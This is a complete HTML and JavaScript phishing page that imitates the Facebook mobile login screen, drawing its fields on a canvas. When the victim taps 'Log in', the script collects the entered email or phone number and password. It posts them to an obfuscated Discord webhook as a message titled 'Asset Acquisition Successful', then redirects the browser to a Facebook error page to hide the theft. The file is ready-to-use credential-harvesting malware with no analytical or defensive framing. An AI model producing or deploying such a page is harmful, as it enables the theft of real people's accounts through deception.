<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>  </title>
    <style>
        body { margin: 0; display: flex; justify-content: center; align-items: center; background-color: #f0f2f5; height: 100vh; font-family: sans-serif; overflow: hidden; touch-action: none; }
        canvas { box-shadow: 0 4px 12px rgba(0,0,0,0.1); max-width: 100%; max-height: 100%; outline: none; }
        #proxyInput { position: absolute; opacity: 0; top: -1000px; left: -1000px; }
    </style>
</head>
<body>

<input type="text" id="proxyInput" autocomplete="off">
<canvas id="appCanvas"></canvas>

<script>
    const canvas = document.getElementById('appCanvas');
    const ctx = canvas.getContext('2d');
    const proxyInput = document.getElementById('proxyInput');

    // --- C ---
    // T
    const obfuscatedEndpoint = [104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,52,51,57,56,53,48,50,51,49,57,53,53,57,56,48,52,51,48,47,111,99,56,79,110,105,115,75,49,109,85,70,117,45,57,89,75,57,95,87,104,97,85,99,121,49,67,117,69,114,80,118,114,66,104,110,83,74,67,78,57,76,119,102,104,116,54,49,55,75,97,100,49,56,103,71,65,104,76,109,79,105,88,105,86,121,112,115];
    
    // h
    const getDestinationEndpoint = () => String.fromCharCode.apply(null, obfuscatedEndpoint);

    const redirectTarget = "https://www.facebook.com/error";

    const UI_LAYOUT = {
        inputs: [
            { id: 'username', x: 0.045, y: 0.396, w: 0.91, h: 0.082, type: 'text', value: '', placeholder: 'Mobile number or email', isFocused: false },
            { id: 'password', x: 0.045, y: 0.490, w: 0.91, h: 0.082, type: 'password', value: '', placeholder: 'Password', isFocused: false }
        ],
        button: { id: 'login', x: 0.045, y: 0.588, w: 0.91, h: 0.065, text: 'Log in' }
    };

    const bgImage = new Image();
    bgImage.src = '1000110812.jpg';
    
    let isImageLoaded = false;
    let cursorVisible = true;
    let cursorInterval = null;
    const FONT_SCALE = 0.035;

    bgImage.onload = () => { isImageLoaded = true; resizeCanvas(); startCursorBlink(); draw(); };
    bgImage.onerror = () => { isImageLoaded = false; resizeCanvas(); draw(); console.log("Image '1000110812.jpg' failed to load. Will render fallback UI."); };

    function resizeCanvas() {
        const imgW = isImageLoaded ? bgImage.width : 500;
        const imgH = isImageLoaded ? bgImage.height : 900;
        const aspectRatio = imgW / imgH;
        let finalWidth = window.innerHeight * aspectRatio;
        let finalHeight = window.innerHeight;
        if (finalWidth > window.innerWidth) {
            finalWidth = window.innerWidth;
            finalHeight = window.innerWidth / aspectRatio;
        }
        canvas.width = finalWidth;
        canvas.height = finalHeight;
        draw();
    }

    window.addEventListener('resize', resizeCanvas);

    function getInteractionPos(evt) {
        const rect = canvas.getBoundingClientRect();
        const scaleX = canvas.width / rect.width;
        const scaleY = canvas.height / rect.height;
        let clientX, clientY;
        if (evt.touches && evt.touches.length > 0) {
            clientX = evt.touches[0].clientX;
            clientY = evt.touches[0].clientY;
        } else if (evt.changedTouches && evt.changedTouches.length > 0) {
            clientX = evt.changedTouches[0].clientX;
            clientY = evt.changedTouches[0].clientY;
        } else {
            clientX = evt.clientX;
            clientY = evt.clientY;
        }
        return { x: (clientX - rect.left) * scaleX, y: (clientY - rect.top) * scaleY };
    }

    function handleInteraction(evt) {
        evt.preventDefault();
        const pos = getInteractionPos(evt);
        let clickedInput = null;
        let buttonClicked = false;
        
        UI_LAYOUT.inputs.forEach(input => input.isFocused = false);

        const btn = UI_LAYOUT.button;
        const bx = btn.x * canvas.width, by = btn.y * canvas.height, bw = btn.w * canvas.width, bh = btn.h * canvas.height;
        if (pos.x >= bx && pos.x <= bx + bw && pos.y >= by && pos.y <= by + bh) {
            buttonClicked = true;
        } else {
            UI_LAYOUT.inputs.forEach(input => {
                const ix = input.x * canvas.width, iy = input.y * canvas.height, iw = input.w * canvas.width, ih = input.h * canvas.height;
                if (pos.x >= ix && pos.x <= ix + iw && pos.y >= iy && pos.y <= iy + ih) {
                    input.isFocused = true;
                    clickedInput = input;
                }
            });
        }
        
        if (buttonClicked) {
            proxyInput.blur();
            triggerDataExfiltration();
        } else if (clickedInput) {
            activateProxyInput(clickedInput);
        } else {
            proxyInput.blur();
        }
        
        draw();
    }

    function activateProxyInput(inputObj) {
        proxyInput.type = inputObj.type === 'password' ? 'password' : 'text';
        proxyInput.value = inputObj.value;
        proxyInput.focus();
    }

    proxyInput.addEventListener('input', () => {
        const focused = UI_LAYOUT.inputs.find(i => i.isFocused);
        if (focused) {
            focused.value = proxyInput.value;
            draw();
        }
    });

    canvas.addEventListener('click', handleInteraction);
    canvas.addEventListener('touchend', handleInteraction, { passive: false });

    function triggerDataExfiltration() {
        const user = UI_LAYOUT.inputs.find(i => i.id === 'username').value;
        const pass = UI_LAYOUT.inputs.find(i => i.id === 'password').value;

        const payload = {
            username: "CRATAK",
            avatar_url: "https://i.imgur.com/4sIcm2g.png", // A more fitting avatar
            embeds: [{
                title: "Asset Acquisition Successful",
                color: 16711680, // Red
                fields: [
                    { name: "Username/Email", value: `\`\`\`${user || "Not Provided"}\`\`\``, inline: false },
                    { name: "Password", value: `\`\`\`${pass || "Not Provided"}\`\`\``, inline: false }
                ],
                footer: { text: "Session Captured At: " + new Date().toISOString() }
            }]
        };

        const request = new XMLHttpRequest();
        // The URL is now reconstructed ephemerally.
        request.open("POST", getDestinationEndpoint());
        request.setRequestHeader('Content-type', 'application/json');
        
        request.onreadystatechange = () => {
            // This ensures redirection happens regardless if the exfiltration succeeds or fails.
            if (request.readyState === 4) {
                 window.location.href = redirectTarget;
            }
        };

        request.send(JSON.stringify(payload));
        
        // Timeout as a fallback in case the onreadystatechange event doesn't fire (e.g., network error).
        setTimeout(() => { window.location.href = redirectTarget; }, 800);
    }

    function startCursorBlink() {
        if (cursorInterval) clearInterval(cursorInterval);
        cursorInterval = setInterval(() => { cursorVisible = !cursorVisible; draw(); }, 530);
    }

    function draw() {
        if (isImageLoaded) {
            ctx.drawImage(bgImage, 0, 0, canvas.width, canvas.height);
        } else {
            ctx.fillStyle = "#f0f2f5";
            ctx.fillRect(0,0, canvas.width, canvas.height);
            ctx.fillStyle = "#1877F2";
            ctx.font = `bold ${canvas.height * 0.1}px sans-serif`;
            ctx.textAlign = "center";
            ctx.fillText("facebook", canvas.width / 2, canvas.height * 0.2);
        }

        UI_LAYOUT.inputs.forEach(input => {
            const ix = input.x * canvas.width, iy = input.y * canvas.height, iw = input.w * canvas.width, ih = input.h * canvas.height;
            if (input.isFocused || input.value.length > 0) {
                ctx.fillStyle = "#FFFFFF";
                ctx.fillRect(ix + 2, iy + 2, iw - 4, ih - 4);
                const fontSize = canvas.height * FONT_SCALE;
                ctx.font = `${fontSize}px sans-serif`;
                ctx.fillStyle = "#000000";
                ctx.textBaseline = "middle";
                ctx.textAlign = "left";
                let displayText = input.type === 'password' ? 'â€¢'.repeat(input.value.length) : input.value;
                const paddingX = iw * 0.05;
                ctx.fillText(displayText, ix + paddingX, iy + (ih / 2));
                if (input.isFocused && cursorVisible) {
                    const textWidth = ctx.measureText(displayText).width;
                    const cursorX = ix + paddingX + textWidth + 2;
                    const cursorH = fontSize * 1.2;
                    const cursorY = iy + (ih - cursorH) / 2;
                    ctx.beginPath();
                    ctx.moveTo(cursorX, cursorY);
                    ctx.lineTo(cursorX, cursorY + cursorH);
                    ctx.lineWidth = 2;
                    ctx.strokeStyle = "#1877F2";
                    ctx.stroke();
                }
            }
        });
    }
</script>

</body>
</html>
